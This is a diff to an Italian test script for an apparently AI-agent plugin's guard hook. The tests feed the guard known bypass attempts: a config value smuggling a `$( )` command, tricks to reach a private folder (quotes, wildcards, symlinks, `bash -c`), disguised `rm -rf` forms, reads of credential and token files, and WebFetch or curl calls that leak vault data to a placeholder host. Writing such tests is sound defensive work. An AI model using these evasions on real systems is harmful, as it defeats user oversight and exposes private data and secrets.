@@ -34,6 +34,10 @@ check "voce di lista aggiunta una volta sola" '[ "$(bash "$ROOT/scripts/configur
 check "chiave non valida rifiutata" '! bash "$ROOT/scripts/configura.sh" set "METIS_A;B" x 2>/dev/null'
 check "file di configurazione con permessi 600" '[ "$(stat -f %Lp "$METIS_CONFIG" 2>/dev/null | grep -x "[0-7]*" || stat -c %a "$METIS_CONFIG")" = 600 ]'
 
+mkdir -p "$T/ev"; printf 'METIS_VAULT=%s\nMETIS_FONTI=$(touch %s/ev/eseguito)\n' "$V" "$T" > "$T/ev/c"
+METIS_CONFIG="$T/ev/c" /bin/bash -c 'source "$0/scripts/lib/config.sh"; metis_carica_config' "$ROOT"
+check "configurazione letta e mai eseguita: una \$( ) in METIS_FONTI non parte" '[ ! -e "$T/ev/eseguito" ]'
+
 echo "2. Struttura (vault esistente, non PARA)"
 mkdir -p "$T/esistente/Clienti/Rossi" "$T/esistente/.obsidian"; echo x > "$T/esistente/Clienti/Rossi/a.md"
 A=$(bash "$ROOT/scripts/installa-struttura.sh" albero "$T/esistente")
@@ -77,6 +81,7 @@ check "cartella riservata negata in lettura" 'grep -q "_Privato/\*\*)" "$P"'
 check "sessioni senza richieste di permesso (decisione del 6/10)" 'python3 -c "import json,sys; sys.exit(0 if json.load(open(\"$P\"))[\"permissions\"][\"defaultMode\"]==\"bypassPermissions\" else 1)"'
 check "divieti sulle cartelle delle credenziali" 'grep -q "Read(~/.ssh/\*\*)" "$P" && grep -q "Library/Keychains" "$P"'
 check "divieto sul login di Claude su Linux" 'grep -q "Read(~/.claude/.credentials.json)" "$P"'
+check "divieti sulle credenziali di Metis e della posta" 'grep -q "Read(~/.config/metis/\*\*)" "$P" && grep -q "Read(~/.config/google-workspace-mcp/\*\*)" "$P" && grep -q "Read(~/.config/rclone/\*\*)" "$P"'
 R_=$(dirname "$METIS_CONFIG")/permessi-routine.json
 check "routine sempre in acceptEdits" 'grep -q "\"defaultMode\": \"acceptEdits\"" "$R_"'
 check "copia per le routine scritta" 'python3 -m json.tool "$T/permessi-routine.json" >/dev/null'
@@ -140,6 +145,58 @@ check "find -L dalla radice del vault: bloccato" 'r "find -L . -type f" | grep -
 check "find avvolto in con-timeout dalla radice: bloccato" 'r "bash /x/scripts/con-timeout.sh 90 find . -name x" | grep -q "\"deny\""'
 check "grep -r avvolto in con-timeout e env: bloccato" 'r "env LC_ALL=C bash /x/scripts/con-timeout.sh 30 grep -r segreto ." | grep -q "\"deny\""'
 check "find avvolto in con-timeout su un'altra cartella: ammesso" '[ -z "$(r "bash /x/scripts/con-timeout.sh 90 find -L $ALTRA -type f")" ]'
+
+echo "5c. Guardia: aggiramenti della revisione di sicurezza del 15/11/2026 (prima passavano)"
+mkdir -p "$V/_Privato" "$V/1 - Progetti"; echo segreto > "$V/_Privato/diario.md"
+ln -sfn "$V/_Privato" "$V/1 - Progetti/scorciatoia"
+check "riservata: virgolette attorno al nome" 'r "cat \"_Privato\"/diario.md" | grep -q "\"deny\""'
+check "riservata: carattere jolly" 'r "cat _Privat?/diario.md" | grep -q "\"deny\""'
+check "riservata: maiuscole diverse" 'r "cat _privato/diario.md" | grep -q "\"deny\""'
+check "riservata: cd e poi cat" 'r "cd _Privato && cat diario.md" | grep -q "\"deny\""'
+check "riservata: ls in una pipe" 'r "ls _Privato | head" | grep -q "\"deny\""'
+check "riservata: collegamento simbolico" 'r "cat \"1 - Progetti/scorciatoia/diario.md\"" | grep -q "\"deny\""'
+check "riservata: dentro bash -c" 'r "bash -c \"cat _Privato/diario.md\"" | grep -q "\"deny\""'
+BR='cat _Pri\vato/diario.md'
+check "riservata: barra rovesciata nel nome" 'r "$BR" | grep -q "\"deny\""'
+check "riservata: Read con maiuscole diverse" 'g Read "$V" "{\"file_path\":\"$V/_PRIVATO/diario.md\"}" | grep -q "\"deny\""'
+check "riservata: Read attraverso il collegamento" 'g Read "$V" "{\"file_path\":\"$V/1 - Progetti/scorciatoia/diario.md\"}" | grep -q "\"deny\""'
+check "esclusione finta: --exclude-dir di un'altra cartella" 'r "grep -r segreto . --exclude-dir=_Privato2" | grep -q "\"deny\""'
+check "esclusione finta: find -path che elenca la cartella" 'r "find . -path *_Privato*" | grep -q "\"deny\""'
+check "esclusione finta: find -path con -exec cat" 'r "find . -path *_Privato* -exec cat {} +" | grep -q "\"deny\""'
+check "esclusione finta: nome in un commento" 'r "grep -rn segreto . # _Privato x" | grep -q "\"deny\""'
+check "esclusione vera con -prune: ammessa" '[ -z "$(r "find . -path ./_Privato -prune -o -name x.md -print")" ]'
+check "nome simile ma diverso: ammesso" '[ -z "$(r "cat \"1 - Progetti/_Privato-bis.md\"")" ]'
+check "rm -f -r: conferma" 'r "rm -f -r vecchio" | grep -q "\"ask\""'
+check "/bin/rm -rf: conferma" 'r "/bin/rm -rf vecchio" | grep -q "\"ask\""'
+check "rm con il flag in fondo (GNU): conferma" 'r "rm vecchio -rf" | grep -q "\"ask\""'
+check "find -delete: conferma" 'r "find vecchio -name x -delete" | grep -q "\"ask\""'
+check "find -exec rm: conferma" 'r "find vecchio -exec rm -rf {} +" | grep -q "\"ask\""'
+check "xargs rm: conferma" 'r "ls | xargs rm" | grep -q "\"ask\""'
+check "rm -f di un file: passa" '[ -z "$(r "rm -f file.tmp")" ]'
+check "invitati con addedAttendees: conferma" 'g mcp__claude_ai_Google_Calendar__update_event "$V" "{\"eventId\":\"x\",\"addedAttendees\":[{\"email\":\"a@b.it\"}]}" | grep -q "\"ask\""'
+check "invitati con attendeeEmails: conferma" 'g mcp__claude_ai_Google_Calendar__create_event "$V" "{\"summary\":\"x\",\"attendeeEmails\":[\"a@b.it\"]}" | grep -q "\"ask\""'
+check "invitati annidati: conferma" 'g ${APP}__create_event "$V" "{\"event\":{\"guests\":[\"a@b.it\"]}}" | grep -q "\"ask\""'
+CFGD=$(dirname "$METIS_CONFIG"); printf 'TOKEN=123:finto\n' > "$CFGD/telegram"
+check "segreti: cat del token del bot: bloccato" 'r "cat $CFGD/telegram" | grep -q "\"deny\""'
+check "segreti: Read della chiave: bloccato" 'g Read "$V" "{\"file_path\":\"$CFGD/telegram\"}" | grep -q "\"deny\""'
+check "segreti: cp della posta locale: bloccato" 'r "cp -r ~/.config/google-workspace-mcp /tmp/x" | grep -q "\"deny\""'
+check "segreti: anche da un'altra cartella del Mac" 'g Bash "$ALTRA" "{\"command\":\"cat $CFGD/telegram\"}" | grep -q "\"deny\""'
+check "segreti: uno script del plugin che li usa: passa" '[ -z "$(r "python3 $ROOT/scripts/telegram/metis_telegram.py verifica $CFGD/telegram")" ]'
+check "fuori dal vault: la cartella riservata per percorso resta bloccata" 'g Bash "$ALTRA" "{\"command\":\"cat \\\"$V/_PRIVATO/diario.md\\\"\"}" | grep -q "\"deny\""'
+check "fuori dal vault: il nome da solo non blocca" '[ -z "$(g Bash "$ALTRA" "{\"command\":\"ls _Privato\"}")" ]'
+check "cwd nella cartella fonti (fuori dal vault): la guardia resta accesa" 'mkdir -p "$T/fonti/x" && g Bash "$T/fonti/x" "{\"command\":\"rm -rf y\"}" | grep -q "\"ask\""'
+check "cartella del progetto nel vault, cwd fuori: la guardia resta accesa" 'evento Bash "$ALTRA" "{\"command\":\"rm -rf y\"}" | CLAUDE_PROJECT_DIR="$V" bash "$ROOT/hooks/guardia.sh" | grep -q "\"ask\""'
+gg() { evento "$1" "$V" "$2" | METIS_GIRO=inbox-processor METIS_GIRO_INIZIO="$3" bash "$ROOT/hooks/guardia.sh"; }
+mkdir -p "$V/0 - Inbox/telegram"; printf 'Link: https://esempio.invalid/articolo\n' > "$V/0 - Inbox/telegram/link.md"
+touch -t 202601010000 "$V/0 - Inbox/telegram/link.md"; ADESSO=$(date +%s)
+check "giro: curl bloccato" 'gg Bash "{\"command\":\"curl https://esempio.invalid/?x=1\"}" "$ADESSO" | grep -q "\"deny\""'
+WF1='{"url":"https://esempio.invalid/articolo","prompt":"riassumi"}'; WF2='{"url":"https://esempio.invalid/?x=1","prompt":"x"}'
+check "giro: WebFetch su un link già nell’Inbox: passa" '[ -z "$(gg WebFetch "$WF1" "$ADESSO")" ]'
+check "giro: WebFetch su un indirizzo costruito: bloccato" 'gg WebFetch "{\"url\":\"https://esempio.invalid/?x=dati-del-vault\",\"prompt\":\"x\"}" "$ADESSO" | grep -q "\"deny\""'
+printf 'https://esempio.invalid/?x=scritto-dal-giro\n' > "$V/0 - Inbox/telegram/nuova.md"
+check "giro: WebFetch su un link scritto durante il giro: bloccato" 'gg WebFetch "{\"url\":\"https://esempio.invalid/?x=scritto-dal-giro\",\"prompt\":\"x\"}" "$((ADESSO-5))" | grep -q "\"deny\""'
+rm -f "$V/0 - Inbox/telegram/nuova.md" "$V/0 - Inbox/telegram/link.md" "$V/1 - Progetti/scorciatoia"
+check "sessione (non giro): WebFetch libero" '[ -z "$(g WebFetch "$V" "$WF2")" ]'
 
 echo "6. Validazione delle scritture"
 w() { printf '{"tool_name":"Write","tool_input":{"file_path":"%s"}}' "$1" | bash "$ROOT/hooks/valida-scrittura.sh" 2>"$T/w.err"; echo $?; }
